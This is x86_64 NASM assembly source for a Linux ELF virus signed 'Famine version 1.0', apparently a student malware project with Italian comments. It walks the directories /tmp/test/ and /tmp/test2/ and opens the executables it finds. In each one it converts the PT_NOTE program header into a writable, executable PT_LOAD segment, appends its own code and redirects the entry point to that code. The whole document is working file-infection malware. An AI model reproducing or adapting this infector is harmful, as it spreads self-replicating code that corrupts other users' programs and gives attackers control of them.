; +--------+------------+--------+------+------+------+------+------+------+
; |  arch  | syscall NR | return | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
; +--------+------------+--------+------+------+------+------+------+------+
; | x86    | eax        | eax    | ebx  | ecx  | edx  | esi  | edi  | ebp  |
; | x86_64 | rax        | rax    | rdi  | rsi  | rdx  | r10  | r8   | r9   |
; +--------+------------+--------+------+------+------+------+------+------+

;	struct linux_dirent64 {
;		ino64_t        d_ino;    /* 64-bit inode number */				8
;		off64_t        d_off;    /* 64-bit offset to next structure */	8
;		unsigned short d_reclen; /* Size of this dirent */				2
;		unsigned char  d_type;   /* File type */						1
;		char           d_name[]; /* Filename (null-terminated) */		8
;	};																	216 tot 24

%define BUF_SIZE 32768

%macro save_regx 0
	push rdi
	push rsi
	push rdx
	push r10
	push r8
	push r9
%endmacro

%macro restore_regx 0
	pop r9
	pop r8
	pop r10
	pop rdx
	pop rsi
	pop rdi
%endmacro

%macro write_my 2 ; puntatore stringa, len stringa
	save_regx
	mov rdi, 0x01
	mov rsi, %1
	mov rdx, %2
	mov rax, 0x01
	syscall
	restore_regx
%endmacro

%macro writefd_my 3 ; puntatore stringa, len stringa, fd
	save_regx
	mov rdi, %3
	mov rsi, %1
	mov rdx, %2
	mov rax, 0x01
	syscall
	restore_regx
%endmacro

%macro exit_my 1 ; exit code
	mov rdi, %1
	mov rax, 0x3c
	syscall
%endmacro

%macro open_my 3 ; nome del file, flag, permessi
	save_regx
	mov rdi, %1
	mov rsi, %2
	mov rdx, %3
	mov rax, 0x02
	syscall
	restore_regx
%endmacro

%macro close_my 1 ; fd
	save_regx
	mov rdi, %1
	mov rax, 0x03
	syscall
	restore_regx
%endmacro

%macro lseek_my 3 ; fd , offset , whence
	save_regx
	mov rdi, %1
	mov rsi, %2
	mov rdx, %3
	mov rax, 0x08
	syscall
	restore_regx
%endmacro

%macro mmap_my 6 ; addr, size, prot, flags, fd, offset
	mov rdi, %1
	mov rsi, %2
	mov rdx, %3
	mov r10, %4
	mov r8, %5
	mov r9, %6
	mov rax, 0x09
	syscall
%endmacro

%macro strlen_my 1 ; puntatore alla stringa
	save_regx
	mov rdi, %1
	xor al, al
	mov rcx, 0xffffffff
	repne scasb
	sub rdi, %1
	mov rax, rdi
	restore_regx
%endmacro

%macro check_executable 1 ; nome del file
	save_regx
	mov rdi, %1
	mov rsi, stat
	mov rax, 0x04			; syscall stat
	syscall
	xor rax, rax
	mov r9, [rsi + 24]		; valore di st_mode in r9
	mov r8w, 1
	test r9, 1b				; verifico se il file è eseguibile
	cmove ax, r8w
	restore_regx
%endmacro

%macro bzero_my 1 ; ptr
	save_regx
	mov rax, -1
	xor rcx, rcx
	mov rsi, 4096
	%%bzero_loop:
		inc rax
		mov byte [%1 + rax], cl
		cmp rax, rcx
		jne %%bzero_loop
	restore_regx
%endmacro

%macro strcat_my 3 ; src1, src2, dest
	save_regx
	bzero_my %3					;reset dest
	mov	rax, -1					;i = -1
	mov rdx, -1					;j = -1
	%%strcat_loop1:				;while
   		inc	rax						;i++
   		inc	rdx						;j++
   		mov	cl, byte [%1 + rdx]		;cl = src[i]
   		mov	byte [%3 + rax], cl		;dest[i] = cl
   		cmp	cl, 0					;if cl == 0
   		jne	%%strcat_loop1
   		mov rdx, -1
   		dec rax
	%%strcat_loop2:				;while
   		inc	rax						;i++
   		inc	rdx						;j++
   		mov	cl, byte [%2 + rdx]		;cl = src[i]
   		mov	byte [%3 + rax], cl		;dest[i] = cl
   		cmp	cl, 0					;if cl == 0
   		jne	%%strcat_loop2			;jump to end if 0
   	restore_regx
%endmacro

%macro check_dir 1 ; stringa della path

	open_my %1, 0, 0
   	test rax, rax					; if open < 0
   	js %%end						; dunque se in rax ci sta un numero con il segno -> exit(1)
   	push rax						; salvo fd

   	mov rdi, rax					; 1 arg getdents64
   	mov rsi, linux_dirent64			; 2 arg
   	mov rdx, BUF_SIZE				; 3 arg
   	mov rax, 0xd9					; syscall
   	syscall

   	mov r14, rax					; salvo tot dati letti da getdents64
   	mov r15, rsi					; salvo il puntatore in r15
   	pop rax							; richiamo fd della cartella
   	close_my rax					; chiudo fd
	%%loop_my:
   		add r15, dirent.d_name			; ptr + d_name[]
   		strcat_my %1, r15, buffer		; unisco in buffer il percorso della dir e il nome del file
   		check_executable buffer			; controllo se il file è un eseguibile
   		cmp rax, 0						; se rax == 0 è eseguibile
   		jne %%else_print_file			; altrimenti si va avanti nel loop
   %%if_print_file:
   		mov rdi, buffer					; primo argomento di insert_payload
   		;call insert_payload				; chiamo la funzione
   		infect buffer, r15
   		jmp %%end_if
   %%else_print_file:
   %%end_if:
   		sub r15, dirent.d_name			; ptr - d_name[]
   		xor r13, r13					; pulisco r13 prima di copiare il dato
   		mov r13w, [r15 + dirent.d_reclen]; salvo la grandezza di questa struttura
   		add r15, r13					; ptr + size struttura
   		sub r14, r13					; sottraggo la size della struttura dal totale letto
   		cmp r14, 0						; controllo se ho letto tutti i byte restituiti
   		ja %%loop_my
   	%%end:
%endmacro

%macro strcmp_for_link_my 1				; nome senza dir
	save_regx
	strlen_my %1						; conto caratteri filename
	cmp rax, 2							; strlen == 2
	je %%one_point
	cmp rax, 3							; strlen == 3
	je %%two_point
	ja %%finish_zero					; strlen > 2

	%%one_point:
		xor rax, rax
		mov cl, [%1]					; primo carattere del filename in cl
		cmp cl, 46						; cl == '.'
		je %%finish_one
	%%two_point:
		xor rcx, rcx
		xor rax, rax
		mov cl, [%1]					; primo carattere del filename in cl
		cmp cl, 46						; cl == '.'
		jne %%finish_zero
		mov cl, [%1 + 1]				; secondo carattere del filename in cl
		cmp cl, 46						; cl == '.'
		je %%finish_one
	%%finish_one:
		mov rax, 1						; ritorna 1 se si tratta di '.' oppure '..'
		jmp %%end
	%%finish_zero:
		xor rax, rax					; altrimenti ritorna 0
		jmp %%end
	%%end:
	restore_regx
%endmacro

%macro write_loop 3						; puntatore, size, fd
	save_regx
	mov rdx, %2
	mov rsi, -1
	mov rcx, %1
	%%loop:
		inc rsi
		add rcx, rsi
		writefd_my rcx, 1, %3
		cmp rsi, rdx
		jne %%loop
	restore_regx
%endmacro

%macro infect 2							;nome del file con dir | nome del file senza dir
	save_regx
	strcmp_for_link_my %2				; per escludere '.' e '..'
	cmp rax, 0
	je %%work_on_file
	jne %%end

	%%work_on_file:
		open_my %1, 0x402, 0
		cmp rax, -1
		je %%end
		mov r9, rax						; r9 = fd file
		push r9
		lseek_my r9, 0, 2
		mov r10, rax					; r10 = size file
		push r10
		mmap_my 0, r10, 0x3, 0x1, r9, 0
		cmp rax, -1
		je %%end
		mov r8, rax						; r8 = mmap file
		mov r11, [r8 + ehdr.e_phoff]	; r11 = phdr
		add r11, r8
		xor r12, r12
		mov r12w, [r8 + ehdr.e_phnum]	; r12 = phnum
		mov rcx, -1
		xor r13, r13
		%%loop:
			inc rcx
			mov r13b, [r11 + phdr.p_type]
			cmp r13, 4					; controllo se è PT_NOTE
			je %%end_loop_trovato
			add r11, 56
			cmp rcx, r12
			jb %%loop
		%%end_loop:
			jmp %%end
		%%end_loop_trovato:						; r11 = puntatore PT_NOTE
			pop r10
			mov dword [r11 + phdr.p_type], 1 	; PT_LOAD
			mov dword [r11 + phdr.p_flags], 7 	; PF_R | PF_X | PF_W
			lea r13, [rel _exit_payload]
			lea rsi, [rel _start]
			sub r13, rsi						; r13 = size payload
			mov qword [r11 + phdr.p_offset], r10; size file
			xor rsi, rsi
			mov rsi, 0xc000000
			add rsi, r10						; rsi = 0xc000000 + size
			mov qword [r11 + phdr.p_vaddr], rsi	; 0xc000000 + size
			add qword [r11 + phdr.p_filesz], r13; += size payload
			add qword [r11 + phdr.p_memsz], r13 ; += size payload
			xor rcx, rcx
			mov ecx, dword [r8 + ehdr.e_entry]	; ecx = e_entry
			sub ecx, esi						; -= p_vaddr
			sub ecx, r13d						; -= size payload
			; rcx = ecx = (uint32_t)offsetJump
			lea rax, [rel _start]
			pop r9
			;sub r13, 823						; tolgo pad di zeri e jmp
			write_loop rax, r13, r9
			;writefd_my insert_jmp, 1, r9		; scrivo opcode jmp
			%%debug:
			xor rax, rax
			mov dword eax, ecx
			;writefd_my rax, 4, r9

			mov qword [r8 + ehdr.e_entry], rsi		; e_entry = p_vaddr
			strlen_my %1
			write_my %1, rax
			write_my string_space, 2
	%%end:
		xor rax, rax
		restore_regx
%endmacro

;extern insert_payload

section .bss
	linux_dirent64 resb BUF_SIZE
	stat resb 144
	buffer resb 4096
	folder resb 4096

section .text
	global _start

_start:

	struc dirent
    	.d_ino resb 8
    	.d_off resb 8
    	.d_reclen resb 2
    	.d_type resb 1
    	.d_name resb 8
    endstruc

    struc ehdr
    	.e_ident		resb 16		;	/* File identification. */
    	.e_type			resb 2		;	/* File type. */
    	.e_machine		resb 2		;	/* Machine architecture. */
    	.e_version		resb 4		;	/* ELF format version. */
    	.e_entry		resb 8		;	/* Entry point. */
    	.e_phoff		resb 8		;	/* Program header file offset. */
    	.e_shoff		resb 8		;	/* Section header file offset. */
    	.e_flags		resb 4		;	/* Architecture-specific flags. */
    	.e_ehsize		resb 2		;	/* Size of ELF header in bytes. */
    	.e_phentsize	resb 2		;	/* Size of program header entry. */
    	.e_phnum		resb 2		;	/* Number of program header entries. */
    	.e_shentsize	resb 2		;	/* Size of section header entry. */
    	.e_shnum		resb 2		;	/* Number of section header entries. */
    	.e_shstrndx		resb 2		;	/* Section name strings section. */
    endstruc

    struc phdr
    	.p_type			resb 4		;	/* Entry type. */
    	.p_flags		resb 4		;	/* Access permission flags. */
    	.p_offset		resb 8		;	/* File offset of contents. */
    	.p_vaddr		resb 8		;	/* Virtual address in memory image. */
    	.p_paddr		resb 8		;	/* Physical address (not used). */
    	.p_filesz		resb 8		;	/* Size of contents in file. */
    	.p_memsz		resb 8		;	/* Size of contents in memory. */
    	.p_align		resb 8		;	/* Alignment in memory and file. */
    endstruc

	check_dir string_dir1
	check_dir string_dir2
	;check_finish
;	mov rdi, folder
;	mov rsi, 4096
;	mov rax, 0x4f					; getcwd
;	syscall
;	strlen_my folder
;	cmp rax, 1
;	jb _exit_famine					; se rax < 1
;	mov rcx, -1
;	mov r14, folder
;	loop_finish:
;		inc rcx
;		mov dl, byte [folder + rcx]
;		cmp dl, '/'
;		jne _exit_famine
;		inc rcx
;		mov dl, byte [folder + rcx]
;		cmp dl, 't'
;		jne _exit_famine
;		inc rcx
;		mov dl, byte [folder + rcx]
;		cmp dl, 'm'
;		jne _exit_famine
;		inc rcx
;		mov dl, byte [folder + rcx]
;		cmp dl, 'p'
;		jne _exit_famine
;		je _exit_payload

_exit_famine:
	exit_my 0

string_space:
	db 10, 0

string_dir1:
	db '/tmp/test/', 0

string_dir2:
	db '/tmp/test2/', 0

string_debug:
	db 'DEBUG', 0

insert_jmp:
	db 0xe9, 0

firma:
	db 'Famine version 1.0 (c)oded by usavoia-usavoia', 0x00

_exit_payload:
	jmp 0xffffffff